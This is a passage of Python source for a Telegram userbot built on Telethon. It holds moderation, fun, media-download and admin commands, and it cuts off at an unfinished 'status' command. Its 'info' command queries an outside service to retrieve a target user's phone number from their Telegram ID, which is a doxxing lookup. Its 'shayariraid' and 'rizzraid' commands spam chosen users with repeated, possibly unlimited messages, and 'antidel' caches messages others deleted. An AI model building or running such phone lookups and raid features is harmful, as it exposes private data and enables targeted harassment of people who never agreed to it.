                if uid in user_bot.global_muted:
                    user_bot.global_muted.remove(uid); removed.append(str(uid))
                else:
                    not_muted.append(str(uid))
            msg = ""
            if removed: msg += f"🔊 Gunmuted: {', '.join(removed)}\n"
            if not_muted: msg += f"⚠️ Not gmuted: {', '.join(not_muted)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("mutelist")
        async def cmd_mutelist(event, _):
            text = "📋 Mute Panel\n━━━━━━━━━━━━━━━\n\n🔇 Local Muted:\n"
            if user_bot.muted_users:
                for uid in user_bot.muted_users:
                    try:
                        u = await user_bot.get_entity(uid)
                        uname = f"@{u.username}" if u.username else "NoUsername"
                        text += f"• {uid} → {uname}\n"
                    except:
                        text += f"• {uid}\n"
            else:
                text += "• None\n"
            text += "\n🌍 Global Muted:\n"
            if user_bot.global_muted:
                for uid in user_bot.global_muted:
                    try:
                        u = await user_bot.get_entity(uid)
                        uname = f"@{u.username}" if u.username else "NoUsername"
                        text += f"• {uid} → {uname}\n"
                    except:
                        text += f"• {uid}\n"
            else:
                text += "• None\n"
            text += "\n🔒 Locked Groups:\n"
            if user_bot.group_locks:
                for gid in user_bot.group_locks:
                    try:
                        chat = await user_bot.get_entity(gid)
                        title = getattr(chat, "title", None) or "PrivateChat"
                        text += f"• {gid} → {title}\n"
                    except:
                        text += f"• {gid}\n"
            else:
                text += "• None\n"
            await safe_edit(event, text)

        # ─── GROUP MOD ───
        @register_cmd("lock", group_only=True)
        async def cmd_lock(event, _):
            chat = event.chat_id
            try:
                perms = await user_bot.get_permissions(chat, 'me')
                if not perms.is_admin:
                    return await safe_edit(event, "❌ Need admin rights")
            except:
                pass
            if chat in user_bot.group_locks:
                return await safe_edit(event, "⚠️ Already locked")
            user_bot.group_locks.add(chat)
            await safe_edit(event, "🔒 Group locked")

        @register_cmd("unlock", group_only=True)
        async def cmd_unlock(event, _):
            chat = event.chat_id
            if chat not in user_bot.group_locks:
                return await safe_edit(event, "⚠️ Not locked")
            user_bot.group_locks.discard(chat)
            await safe_edit(event, "🔓 Group unlocked")

        @register_cmd("purge")
        async def cmd_purge(event, arg):
            try:
                count = int(arg) if arg else 50
                if count < 1: count = 1
                if count > 200: count = 200
            except:
                count = 50
            msgs = []
            async for m in user_bot.iter_messages(event.chat_id, limit=count+1):
                msgs.append(m.id)
            if not msgs:
                return await safe_edit(event, "⚠️ No messages")
            try:
                await user_bot.delete_messages(event.chat_id, msgs)
            except FloodWaitError as fw:
                await asyncio.sleep(fw.seconds)
                await user_bot.delete_messages(event.chat_id, msgs)
            await safe_edit(event, f"🧹 Purged {len(msgs)-1} messages")

        @register_cmd("throw", needs_reply=True, group_only=True)
        async def cmd_throw(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            try:
                perms = await user_bot.get_permissions(event.chat_id, 'me')
                if not perms.is_admin:
                    return await safe_edit(event, "❌ Need admin rights")
            except:
                return await safe_edit(event, "❌ Permission check failed")
            kicked, failed, skipped = [], [], []
            me2 = await user_bot.get_me()
            for uid in targets:
                if uid == me2.id:
                    skipped.append(str(uid)); continue
                try:
                    await user_bot.kick_participant(event.chat_id, uid)
                    kicked.append(str(uid))
                except:
                    failed.append(str(uid))
            msg = ""
            if kicked: msg += f"👞 Kicked: {', '.join(kicked)}\n"
            if failed: msg += f"⚠️ Failed: {', '.join(failed)}\n"
            if skipped: msg += f"👑 Self skip: {', '.join(skipped)}"
            if not msg: msg = "❌ No action"
            await safe_edit(event, msg)

        @register_cmd("addbots", group_only=True)
        async def cmd_addbots(event, arg):
            if not arg or not arg.isdigit():
                return await safe_edit(event, "❌ Usage: .addbots <count>")
            limit = int(arg)
            if limit < 1: limit = 1
            if limit > len(user_bot.ADD_BOTS_LIST): limit = len(user_bot.ADD_BOTS_LIST)
            try:
                perms = await user_bot.get_permissions(event.chat_id, 'me')
                if not perms.is_admin:
                    return await safe_edit(event, "❌ Need admin rights")
            except:
                return await safe_edit(event, "❌ Permission check failed")
            chat = event.chat_id
            status = await safe_edit(event, f"🔄 Adding {limit} bots...")
            added, already, failed = 0, 0, 0
            for idx, bot_username in enumerate(user_bot.ADD_BOTS_LIST[:limit], 1):
                try:
                    await status.edit(f"🔄 {idx}/{limit} → @{bot_username}")
                    entity = await user_bot.get_entity(bot_username)
                    if isinstance(chat, types.Chat):
                        await user_bot(functions.messages.AddChatUserRequest(chat_id=chat.id, user_id=entity, fwd_limit=0))
                    else:
                        await user_bot(functions.channels.InviteToChannelRequest(channel=chat, users=[entity]))
                    added += 1
                    await asyncio.sleep(2.5)
                except FloodWaitError as fw:
                    await status.edit(f"⏳ Flood {fw.seconds}s")
                    await asyncio.sleep(fw.seconds)
                except RPCError as e:
                    if "already" in str(e).lower() or "participant" in str(e).lower():
                        already += 1
                    else:
                        failed += 1
                except:
                    failed += 1
            await status.edit(f"📊 Result\nAdded: {added}\nAlready: {already}\nFailed: {failed}")

        @register_cmd("tagall", group_only=True)
        async def cmd_tagall(event, arg):
            chat = event.chat_id
            try:
                perms = await user_bot.get_permissions(chat, 'me')
                if not perms.is_admin:
                    return await safe_edit(event, "❌ Need admin rights")
            except:
                return await safe_edit(event, "❌ Permission check failed")
            msg = arg.strip() if arg else "Hey everyone! 🎉"
            await safe_edit(event, "⏳ Fetching members...")
            try:
                participants = []
                async for p in user_bot.iter_participants(chat, limit=5000):
                    if not p.deleted and not p.bot:
                        participants.append(p)
                if not participants:
                    return await safe_edit(event, "❌ No members found")
                total = len(participants)
                await safe_edit(event, f"⏳ {total} members found. Sending mentions...")
                chunk_size = 50
                chunks = [participants[i:i+chunk_size] for i in range(0, total, chunk_size)]
                sent = 0
                for idx, chunk in enumerate(chunks):
                    mention_text = ""
                    for user in chunk:
                        if user.username:
                            mention_text += f"@{user.username} "
                        else:
                            mention_text += f"[{user.first_name or 'User'}](tg://user?id={user.id}) "
                    final_msg = f"{msg}\n\n{mention_text}" if idx == 0 else mention_text
                    try:
                        await user_bot.send_message(chat, final_msg)
                        sent += len(chunk)
                        await asyncio.sleep(1)
                    except FloodWaitError as fw:
                        await asyncio.sleep(fw.seconds)
                await safe_edit(event, f"✅ Tagged {sent} members (Total {total})")
            except Exception as e:
                await safe_edit(event, f"❌ Error: {e}")

        # ─── PROTECTION ───
        @register_cmd("antidel")
        async def cmd_antidel(event, arg):
            arg = arg.lower() if arg else ""
            if arg in ("on", "start", "enable"):
                user_bot.antidel_enabled = True
                user_bot.antidel_cache.clear()
                await safe_edit(event, "🛡️ Anti-Delete ON")
            elif arg in ("off", "stop", "disable"):
                user_bot.antidel_enabled = False
                user_bot.antidel_cache.clear()
                await safe_edit(event, "🔓 Anti-Delete OFF")
            else:
                status = "🟢 ON" if user_bot.antidel_enabled else "🔴 OFF"
                await safe_edit(event, f"🛡️ Anti-Delete Status: {status}\nCached: {len(user_bot.antidel_cache)}")

        @register_cmd("watchspam")
        async def cmd_watchspam(event, arg):
            parts = arg.split() if arg else []
            if len(parts) < 1:
                return await safe_edit(event, "❌ Usage: .watchspam @user <limit> <sec>")
            limit = 3
            seconds = 5.0
            if len(parts) >= 2:
                try: limit = int(parts[1])
                except: pass
            if len(parts) >= 3:
                try: seconds = float(parts[2])
                except: pass
            limit = max(1, min(limit, 20))
            seconds = max(1.0, min(seconds, 60.0))
            target_arg = parts[0].lstrip("@")
            try:
                entity = await user_bot.get_entity(target_arg)
                uid = int(entity.id)
                uname = getattr(entity, "first_name", target_arg) or target_arg
            except:
                if event.is_reply:
                    reply = await event.get_reply_message()
                    uid = reply.sender_id
                    uname = str(uid)
                else:
                    return await safe_edit(event, "❌ User not found. Reply or pass username.")
            chat = event.chat_id
            user_bot.watch_spam[(chat, uid)] = {"limit": limit, "seconds": seconds, "times": [], "name": uname}
            await safe_edit(event, f"👁️ WatchSpam on {uname} (limit {limit} in {seconds}s)")

        @register_cmd("unwatchspam")
        async def cmd_unwatchspam(event, arg):
            chat = event.chat_id
            if arg:
                try:
                    entity = await user_bot.get_entity(arg.strip())
                    uid = int(entity.id)
                except:
                    if event.is_reply:
                        reply = await event.get_reply_message()
                        uid = reply.sender_id
                    else:
                        return await safe_edit(event, "❌ User not found")
                if (chat, uid) in user_bot.watch_spam:
                    del user_bot.watch_spam[(chat, uid)]
                    await safe_edit(event, f"✅ Removed watch on {uid}")
                else:
                    await safe_edit(event, "⚠️ No active watch")
            else:
                keys = [k for k in user_bot.watch_spam if k[0] == chat]
                for k in keys:
                    del user_bot.watch_spam[k]
                await safe_edit(event, "🗑️ All watches removed from this chat")

        @register_cmd("watchlist")
        async def cmd_watchlist(event, _):
            chat = event.chat_id
            entries = {k: v for k, v in user_bot.watch_spam.items() if k[0] == chat}
            if not entries:
                return await safe_edit(event, "📭 No watches active")
            msg = "👁️ WatchList:\n"
            for (_, uid), v in entries.items():
                msg += f"• {v.get('name', uid)} → limit {v['limit']} / {v['seconds']}s\n"
            await safe_edit(event, msg)

        # ─── AUTO REACT ───
        @register_cmd("ar")
        async def cmd_ar(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Usage: .ar <emoji>")
            user_bot.auto_react_emoji = arg.strip()
            await safe_edit(event, f"✅ Auto-react set to {arg}")

        @register_cmd("sar")
        async def cmd_sar(event, _):
            user_bot.auto_react_emoji = None
            await safe_edit(event, "🛑 Auto-react disabled")

        @register_cmd("react", needs_reply=True)
        async def cmd_react(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            emoji = None
            if arg:
                parts = arg.strip().split()
                if parts and len(parts[-1]) <= 4:
                    emoji = parts[-1]
            if not emoji:
                emoji = user_bot.auto_react_emoji
                if not emoji:
                    return await safe_edit(event, "❌ Set global emoji first with .ar or pass emoji in command")
            added, updated, skipped = [], [], []
            for uid in targets:
                if uid in OWNER_IDS:
                    skipped.append(str(uid)); continue
                if uid in user_bot.react_targets:
                    old = user_bot.react_targets[uid]
                    if old != emoji:
                        user_bot.react_targets[uid] = emoji
                        updated.append(f"{uid} ({old}→{emoji})")
                else:
                    user_bot.react_targets[uid] = emoji
                    added.append(str(uid))
            msg = ""
            if added: msg += f"✅ Added: {', '.join(added)} → {emoji}\n"
            if updated: msg += f"🔄 Updated: {', '.join(updated)}\n"
            if skipped: msg += f"👑 Owner skipped: {', '.join(skipped)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("unreact", needs_reply=True)
        async def cmd_unreact(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            removed, not_found, skipped = [], [], []
            for uid in targets:
                if uid in OWNER_IDS:
                    skipped.append(str(uid)); continue
                if uid in user_bot.react_targets:
                    del user_bot.react_targets[uid]
                    removed.append(str(uid))
                else:
                    not_found.append(str(uid))
            msg = ""
            if removed: msg += f"🗑️ Removed: {', '.join(removed)}\n"
            if not_found: msg += f"⚠️ Not in list: {', '.join(not_found)}\n"
            if skipped: msg += f"👑 Owner skipped: {', '.join(skipped)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("reactlist")
        async def cmd_reactlist(event, _):
            if not user_bot.react_targets:
                return await safe_edit(event, "📭 No react targets")
            msg = "📋 React Targets:\n"
            for uid, emoji in user_bot.react_targets.items():
                try:
                    u = await user_bot.get_entity(uid)
                    name = f"@{u.username}" if u.username else u.first_name or str(uid)
                    msg += f"• {uid} → {name} → {emoji}\n"
                except:
                    msg += f"• {uid} → {emoji}\n"
            await safe_edit(event, msg)

        # ─── NOTES ───
        @register_cmd("notesadd")
        async def notes_add(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Give note text")
            nid = max(user_bot.notes.keys(), default=0) + 1
            user_bot.notes[nid] = arg[:4000]
            save_notes()
            await safe_edit(event, f"📝 Note saved with ID {nid}")

        @register_cmd("noteslist")
        async def notes_list(event, _):
            if not user_bot.notes:
                return await safe_edit(event, "📭 No notes")
            msg = "📝 Your Notes:\n"
            for i, t in sorted(user_bot.notes.items()):
                msg += f"• {i} → {t[:100]}\n"
            await safe_edit(event, msg)

        @register_cmd("notesdelete")
        async def notes_delete(event, arg):
            if not arg or not arg.isdigit():
                return await safe_edit(event, "❌ Give ID")
            nid = int(arg)
            if nid not in user_bot.notes:
                return await safe_edit(event, "⚠️ Note not found")
            del user_bot.notes[nid]
            save_notes()
            await safe_edit(event, f"🗑️ Note {nid} deleted")

        # ─── TOOLS ───
        @register_cmd("tts")
        async def cmd_tts(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Usage: .tts <text> [lang]")
            parts = arg.split(maxsplit=1)
            lang = "hi"
            text = arg
            if len(parts) == 2 and parts[1] in ['hi','en','es','fr','de','ja','zh','ar']:
                lang = parts[1]
                text = parts[0]
            else:
                words = arg.split()
                if len(words) >= 2 and words[-1] in ['hi','en','es','fr','de','ja','zh','ar']:
                    lang = words[-1]
                    text = ' '.join(words[:-1])
            await safe_edit(event, f"⚡ Generating TTS ({lang})...")
            fname = f"tts_{int(time.time())}.mp3"
            try:
                gTTS(text=text[:5000], lang=lang, slow=False).save(fname)
                if event.out:
                    await event.delete()
                    await user_bot.send_file(event.chat_id, fname, caption=f"🎙️ TTS ({lang})")
                else:
                    await event.reply(file=fname, message=f"🎙️ TTS ({lang})")
            except:
                await safe_edit(event, "❌ TTS failed")
            finally:
                try: os.remove(fname)
                except: pass

        @register_cmd("qrcode")
        async def cmd_qrcode(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Usage: .qrcode <text>")
            await safe_edit(event, "⚡ Generating QR...")
            fname = f"qr_{int(time.time())}.png"
            qrcode.make(arg[:3000]).save(fname)
            try:
                if event.out:
                    await event.delete()
                    await user_bot.send_file(event.chat_id, fname, caption="🔳 QR Code")
                else:
                    await event.reply(file=fname, message="🔳 QR Code")
            finally:
                try: os.remove(fname)
                except: pass

        @register_cmd("fancy")
        async def cmd_fancy(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Usage: .fancy <text>")
            t = arg[:2000]
            styles = [
                t.upper(), t.lower(),
                f"★彡 {t} 彡★", f"『 {t} 』",
                f"✦ {t} ✦", f"☾ {t} ☽",
                f"➳ {t} ➳", f"⚡ {t} ⚡",
                f"⫷ {t} ⫸", f"♛ {t} ♛",
                f"✧･ﾟ: *✧ {t} ✧*:･ﾟ✧",
                f"꧁ {t} ꧂", f"░▒▓ {t} ▓▒░",
                f"✿ {t} ✿", f"彡★ {t} ★彡"
            ]
            await safe_edit(event, "✨ Fancy Styles\n━━━━━━━━━━━━━━━\n" + "\n".join(styles))

        @register_cmd("style")
        async def cmd_style(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Usage: .style <text>")
            t = arg[:2000]
            fancy = t.replace('a','𝒶').replace('b','𝒷').replace('c','𝒸').replace('d','𝒹').replace('e','𝑒').replace('f','𝒻').replace('g','𝑔').replace('h','𝒽').replace('i','𝒾').replace('j','𝒿').replace('k','𝓀').replace('l','𝓁').replace('m','𝓂').replace('n','𝓃').replace('o','𝑜').replace('p','𝓅').replace('q','𝓆').replace('r','𝓇').replace('s','𝓈').replace('t','𝓉').replace('u','𝓊').replace('v','𝓋').replace('w','𝓌').replace('x','𝓍').replace('y','𝓎').replace('z','𝓏')
            await safe_edit(event, f"🎨 Style\n━━━━━━━━━━━━━━━\n𝒇𝒂𝒏𝒄ʏ → {fancy}\n**Bold** → **{t}**\n__Italic__ → __{t}__\n`Mono` → `{t}`")

        @register_cmd("emoji")
        async def cmd_emoji(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Usage: .emoji <text>")
            pool = ["🔥","❤️","✨","⚡","💥","🌟","💫","🎯","💎","🦋","🌈","🧨","🎆","👑","🌸","🪄","🌊","❄️","🍁","🌙","☀️","💣","🎵","🧿"]
            emojis = "".join(random.choice(pool) for _ in range(8))
            await safe_edit(event, f"😀 Emoji Style\n━━━━━━━━━━━━━━━\n{arg[:2000]} {emojis}")

        @register_cmd("calc")
        async def cmd_calc(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Usage: .calc <expression>")
            expr = arg.replace(" ", "")
            if any(c not in "0123456789+-*/().%" for c in expr):
                return await safe_edit(event, "❌ Invalid chars")
            try:
                res = eval(expr, {"__builtins__": None}, {})
                await safe_edit(event, f"🧮 Calculator\n━━━━━━━━━━━━━━━\n{expr} = {res}")
            except:
                await safe_edit(event, "❌ Invalid expression")

        @register_cmd("weather")
        async def cmd_weather(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Give city")
            await safe_edit(event, "⚡ Fetching weather...")
            try:
                geo = requests.get(f"https://geocoding-api.open-meteo.com/v1/search?name={arg}&count=1", timeout=8).json()
                if not geo.get("results"):
                    return await safe_edit(event, "❌ City not found")
                res = geo["results"][0]
                lat, lon, name = res["latitude"], res["longitude"], res["name"]
                w = requests.get(f"https://api.open-meteo.com/v1/forecast?latitude={lat}&longitude={lon}&current_weather=true", timeout=8).json()
                cw = w.get("current_weather")
                if not cw:
                    return await safe_edit(event, "❌ No data")
                await safe_edit(event, f"🌦️ Weather\n━━━━━━━━━━━━━━━\n📍 {name}\n🌡️ {cw['temperature']}°C\n💨 {cw['windspeed']} km/h")
            except:
                await safe_edit(event, "❌ Weather API error")

        @register_cmd("ip")
        async def cmd_ip(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Give IP")
            try:
                data = requests.get(f"http://ip-api.com/json/{arg}", timeout=8).json()
                if data.get("status") != "success":
                    return await safe_edit(event, "❌ Invalid IP")
                await safe_edit(event, f"🌍 IP Info\n━━━━━━━━━━━━━━━\n📡 {data['query']}\n🌐 {data['country']}\n🏙️ {data['city']}\n📍 {data['isp']}")
            except:
                await safe_edit(event, "❌ IP lookup failed")

        @register_cmd("short")
        async def cmd_short(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Give URL")
            if not arg.startswith(("http://", "https://")):
                arg = "http://" + arg
            try:
                short_url = requests.get(f"http://tinyurl.com/api-create.php?url={requests.utils.requote_uri(arg)}", timeout=8).text.strip()
                await safe_edit(event, f"🔗 Short URL\n━━━━━━━━━━━━━━━\n{short_url}")
            except:
                await safe_edit(event, "❌ Shortening failed")

        @register_cmd("info")
        async def cmd_info(event, arg):
            target = None
            if event.is_reply:
                r = await event.get_reply_message()
                if r and r.sender_id:
                    target = r.sender_id
            elif arg:
                try:
                    ent = await user_bot.get_entity(arg)
                    target = ent.id
                except:
                    return await safe_edit(event, "❌ Invalid user")
            if not target:
                return await safe_edit(event, "⚠️ Reply or pass user")
            await safe_edit(event, "⚡ Fetching user info...")
            try:
                user = await user_bot.get_entity(target)
                if user.id in OWNER_IDS:
                    return await safe_edit(event, "🔒 Owner private")
                full = await user_bot(functions.users.GetFullUserRequest(user.id))
                bio = full.full_user.about or "No Bio"
                uname = f"@{user.username}" if user.username else "No User"
                phone = "Not available"
                try:
                    import aiohttp
                    async with aiohttp.ClientSession() as sess:
                        async with sess.get(f"http://api.subhxcosmo.in/api?key=titan&type=sms&term={user.id}", timeout=5) as r:
                            if r.status == 200:
                                d = await r.json()
                                num = d.get("result", {}).get("number")
                                code = d.get("result", {}).get("country_code", "")
                                if num:
                                    phone = f"{code}{num}"
                except:
                    pass
                await safe_edit(event, f"👤 User Info\n━━━━━━━━━━━━━━━\n🆔 ID: `{user.id}`\n📛 Name: {user.first_name or ''} {user.last_name or ''}\n🔗 User: {uname}\n📱 Phone: `{phone}`\n📝 Bio: {bio}")
            except Exception as e:
                await safe_edit(event, f"❌ Info error: {e}")

        # ─── MUSIC ───
        @register_cmd("music")
        async def cmd_music(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Usage: .music <song>")
            query = arg.strip()
            frames = ["▰▱▱▱▱", "▰▰▱▱▱", "▰▰▰▱▱", "▰▰▰▰▱", "▰▰▰▰▰"]
            status = await safe_edit(event, f"🎵 Processing `{query}`\n\n{frames[0]}")
            stop_loader = asyncio.Event()
            async def loader():
                i = 0
                while not stop_loader.is_set():
                    try:
                        await status.edit(f"🎵 Processing `{query}`\n\n{frames[i % 5]}")
                    except:
                        pass
                    i += 1
                    await asyncio.sleep(1)
            loader_task = asyncio.create_task(loader())
            async def voice_music():
                try:
                    loop = asyncio.get_running_loop()
                    ydl_opts = {
                        "format": "bestaudio[abr<=128]/bestaudio/best",
                        "outtmpl": "vn_%(id)s.%(ext)s",
                        "quiet": True,
                        "default_search": "ytsearch1",
                        "noplaylist": True,
                        "retries": 5,
                        "extractor_args": {"youtube": {"player_client": ["tv_embedded", "android", "mweb"]}},
                        "http_headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36"}
                    }
                    def dl():
                        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                            return ydl.extract_info(query, download=True)
                    info = await loop.run_in_executor(None, dl)
                    if "entries" in info:
                        info = info["entries"][0]
                    vid = info.get("id")
                    title = info.get("title") or query
                    dur = info.get("duration") or 0
                    mins, secs = divmod(dur, 60)
                    dtext = f"{mins}:{secs:02d}"
                    files = glob.glob(f"vn_{vid}.*")
                    if not files:
                        stop_loader.set(); loader_task.cancel()
                        return await safe_edit(event, "❌ Download fail")
                    src = files[0]
                    clean = re.sub(r"[^\w\s-]", "", title).strip()[:40]
                    new = f"{clean}.ogg"
                    try:
                        os.rename(src, new)
                    except:
                        new = src
                    stop_loader.set(); loader_task.cancel()
                    await safe_edit(event, f"🎙️ Sending `{clean}`")
                    await user_bot.send_file(event.chat_id, new, voice_note=True, caption=f"🎵 Music\n━━━━━━━━━━━━━━━\n📀 `{clean}`\n⏱ {dtext}")
                    try:
                        os.remove(new)
                    except:
                        pass
                except Exception as e:
                    stop_loader.set(); loader_task.cancel()
                    await safe_edit(event, f"❌ Music error: {e}")
            asyncio.create_task(voice_music())

        @register_cmd("dmusic")
        async def cmd_dmusic(event, arg):
            if not arg:
                return await safe_edit(event, "❌ Usage: .dmusic <song>")
            query = arg.strip()
            frames = ["▰▱▱▱▱", "▰▰▱▱▱", "▰▰▰▱▱", "▰▰▰▰▱", "▰▰▰▰▰"]
            status = await safe_edit(event, f"📥 Downloading `{query}`\n\n{frames[0]}")
            stop_loader = asyncio.Event()
            async def loader():
                i = 0
                while not stop_loader.is_set():
                    try:
                        await status.edit(f"📥 Downloading `{query}`\n\n{frames[i % 5]}")
                    except:
                        pass
                    i += 1
                    await asyncio.sleep(1)
            loader_task = asyncio.create_task(loader())
            async def download_music():
                try:
                    loop = asyncio.get_running_loop()
                    ydl_opts = {
                        "format": "bestaudio/best",
                        "outtmpl": "dm_%(id)s.%(ext)s",
                        "quiet": True,
                        "default_search": "ytsearch1",
                        "noplaylist": True,
                        "retries": 5,
                        "postprocessors": [{"key": "FFmpegExtractAudio", "preferredcodec": "mp3", "preferredquality": "320"}],
                        "extractor_args": {"youtube": {"player_client": ["tv_embedded", "android", "mweb"]}},
                        "http_headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36"}
                    }
                    def dl():
                        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                            return ydl.extract_info(query, download=True)
                    info = await loop.run_in_executor(None, dl)
                    if "entries" in info:
                        info = info["entries"][0]
                    vid = info.get("id")
                    title = info.get("title") or query
                    dur = info.get("duration") or 0
                    artist = info.get("uploader") or "Unknown"
                    mins, secs = divmod(dur, 60)
                    dtext = f"{mins}:{secs:02d}"
                    files = glob.glob(f"dm_{vid}*.mp3")
                    if not files:
                        files = glob.glob(f"dm_{vid}.*")
                    if not files:
                        stop_loader.set(); loader_task.cancel()
                        return await safe_edit(event, "❌ Download fail")
                    src = files[0]
                    clean = re.sub(r"[^\w\s-]", "", title).strip()[:50]
                    ext = os.path.splitext(src)[1]
                    new = f"{clean}{ext}"
                    try:
                        os.rename(src, new)
                    except:
                        new = src
                    stop_loader.set(); loader_task.cancel()
                    await safe_edit(event, f"📤 Sending `{clean}`")
                    await user_bot.send_file(event.chat_id, new,
                        caption=f"📥 Music Download\n━━━━━━━━━━━━━━━\n🎵 `{clean}`\n🎤 `{artist}`\n⏱ {dtext}\n🎧 320 kbps MP3",
                        attributes=[types.DocumentAttributeAudio(duration=dur, title=title, performer=artist)])
                    try:
                        os.remove(new)
                    except:
                        pass
                except Exception as e:
                    stop_loader.set(); loader_task.cancel()
                    await safe_edit(event, f"❌ DMusic error: {e}")
            asyncio.create_task(download_music())

        # ─── SHAYARI & RIZZ RAIDS ───
        @register_cmd("shayariraid", needs_reply=True)
        async def cmd_shayariraid(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            count = None
            if arg:
                parts = arg.strip().split()
                if parts and parts[-1].isdigit():
                    count = int(parts[-1])
                    if count < 1: count = 1
                    if count > 100: count = 100
            if not shayari_texts:
                return await safe_edit(event, "❌ Shayari list empty")
            added = []
            for uid in targets:
                user_bot.shayari_raid[uid] = count
                display = "∞" if count is None else f"{count} times"
                added.append(f"{uid} ({display})")
            await safe_edit(event, f"✅ Shayari raid started for {', '.join(added)}")

        @register_cmd("sshayariraid")
        async def cmd_sshayariraid(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                user_bot.shayari_raid.clear()
                return await safe_edit(event, "🛑 Shayari raid stopped for all")
            removed = []
            for uid in targets:
                if uid in user_bot.shayari_raid:
                    del user_bot.shayari_raid[uid]; removed.append(str(uid))
            if removed:
                await safe_edit(event, f"🛑 Removed: {', '.join(removed)}")
            else:
                await safe_edit(event, "⚠️ No active raid for these users")

        @register_cmd("shayarilist")
        async def cmd_shayarilist(event, _):
            if not shayari_texts:
                return await safe_edit(event, "📭 No shayari saved")
            msg = "📜 Shayari List:\n\n"
            for i, txt in enumerate(shayari_texts, 1):
                preview = txt.replace("\n", " ")[:60]
                msg += f"`{i}.` {preview}...\n"
            await safe_edit(event, msg)

        @register_cmd("rizzraid", needs_reply=True)
        async def cmd_rizzraid(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            count = None
            if arg:
                parts = arg.strip().split()
                if parts and parts[-1].isdigit():
                    count = int(parts[-1])
                    if count < 1: count = 1
                    if count > 100: count = 100
            if not rizz_texts:
                return await safe_edit(event, "❌ Rizz list empty")
            added = []
            for uid in targets:
                user_bot.rizz_raid[uid] = count
                display = "∞" if count is None else f"{count} times"
                added.append(f"{uid} ({display})")
            await safe_edit(event, f"✅ Rizz raid started for {', '.join(added)}")

        @register_cmd("srizzraid")
        async def cmd_srizzraid(event, arg):
            targets = await get_targets(event, arg)
            if not targets:
                user_bot.rizz_raid.clear()
                return await safe_edit(event, "🛑 Rizz raid stopped for all")
            removed = []
            for uid in targets:
                if uid in user_bot.rizz_raid:
                    del user_bot.rizz_raid[uid]; removed.append(str(uid))
            if removed:
                await safe_edit(event, f"🛑 Removed: {', '.join(removed)}")
            else:
                await safe_edit(event, "⚠️ No active raid for these users")

        @register_cmd("rizzlist")
        async def cmd_rizzlist(event, _):
            if not rizz_texts:
                return await safe_edit(event, "📭 No rizz lines saved")
            msg = "💋 Rizz List:\n\n"
            for i, txt in enumerate(rizz_texts, 1):
                preview = txt.replace("\n", " ")[:60]
                msg += f"`{i}.` {preview}...\n"
            await safe_edit(event, msg)

        # ─── ADMIN ───
        @register_cmd("addadmin", needs_reply=True)
        async def cmd_addadmin(event, arg):
            if event.sender_id not in OWNER_IDS:
                return await safe_edit(event, "❌ Owner only command.")
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            added, already, skipped = [], [], []
            for uid in targets:
                if uid in OWNER_IDS:
                    skipped.append(str(uid)); continue
                if uid in user_bot.admins:
                    already.append(str(uid))
                else:
                    user_bot.admins.add(uid); added.append(str(uid))
            save_admins()
            msg = ""
            if added: msg += f"✅ Added: {', '.join(added)}\n"
            if already: msg += f"⚠️ Already: {', '.join(already)}\n"
            if skipped: msg += f"👑 Owner skipped: {', '.join(skipped)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("deladmin", needs_reply=True)
        async def cmd_deladmin(event, arg):
            if event.sender_id not in OWNER_IDS:
                return await safe_edit(event, "❌ Owner only command.")
            targets = await get_targets(event, arg)
            if not targets:
                return await safe_edit(event, "❌ No target")
            removed, not_admin, skipped = [], [], []
            for uid in targets:
                if uid in OWNER_IDS:
                    skipped.append(str(uid)); continue
                if uid in user_bot.admins:
                    user_bot.admins.remove(uid); removed.append(str(uid))
                else:
                    not_admin.append(str(uid))
            save_admins()
            msg = ""
            if removed: msg += f"🗑️ Removed: {', '.join(removed)}\n"
            if not_admin: msg += f"⚠️ Not admin: {', '.join(not_admin)}\n"
            if skipped: msg += f"👑 Owner skipped: {', '.join(skipped)}"
            if not msg: msg = "❌ No changes"
            await safe_edit(event, msg)

        @register_cmd("admins")
        async def cmd_admins(event, _):
            admin_list = "\n".join(f"• `{a}`" for a in sorted(user_bot.admins)) if user_bot.admins else "⚠️ No extra admins"
            owner_list = "\n".join(f"👑 `{o}`" for o in sorted(OWNER_IDS))
            await safe_edit(event, f"👑 Owners:\n{owner_list}\n\n━━━━━━━━━━━━━━━\n👥 Admins:\n{admin_list}\n\nTotal Admins: {len(user_bot.admins)}")

        # ─── BASIC COMMANDS ───
        @register_cmd("ping")
        async def cmd_ping(event, _):
            t0 = time.perf_counter()
            try:
                if event.out:
                    msg = await event.edit("🏓 Pong...")
                else:
                    msg = await event.reply("🏓 Pong...")
            except:
                msg = None
            t1 = time.perf_counter()
            ms = round((t1 - t0) * 1000)
            try:
                if msg:
                    await msg.edit(f"🏓 Pong → `{ms} ms`")
                else:
                    await event.reply(f"🏓 Pong → `{ms} ms`")
            except:
                pass

        @register_cmd("status")
        async def cmd_status(event, _):
